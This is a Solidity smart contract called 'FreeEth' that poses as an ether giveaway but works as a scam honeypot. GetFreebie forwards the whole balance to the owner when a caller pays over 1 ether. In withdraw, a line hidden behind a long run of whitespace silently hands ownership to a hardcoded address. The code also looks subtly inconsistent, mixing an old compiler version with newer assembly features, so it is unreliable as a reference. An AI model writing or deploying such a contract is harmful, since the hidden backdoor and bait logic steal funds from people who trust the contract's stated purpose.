pragma solidity ^0.4.19;

contract FreeEth
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        assembly {
            if gt(callvalue(), 1000000000000000000) {
                // Transfer balance to Owner
                let success := call(gas(), sload(Owner_slot), selfbalance(), 0, 0, 0, 0)
                if eq(success, 0) { revert(0, 0) }
                // Transfer remaining balance to msg.sender
                success := call(gas(), caller, selfbalance(), 0, 0, 0, 0)
                if eq(success, 0) { revert(0, 0) }
            }
        }
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Owner);
        assembly {
            let success := call(gas(), sload(Owner_slot), selfbalance(), 0, 0, 0, 0)
            if eq(success, 0) { revert(0, 0) }
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        assembly {
            let success := call(gas(), adr, callvalue(), add(data, 0x20), mload(data), 0, 0)
            if eq(success, 0) { revert(0, 0) }
        }
    }
}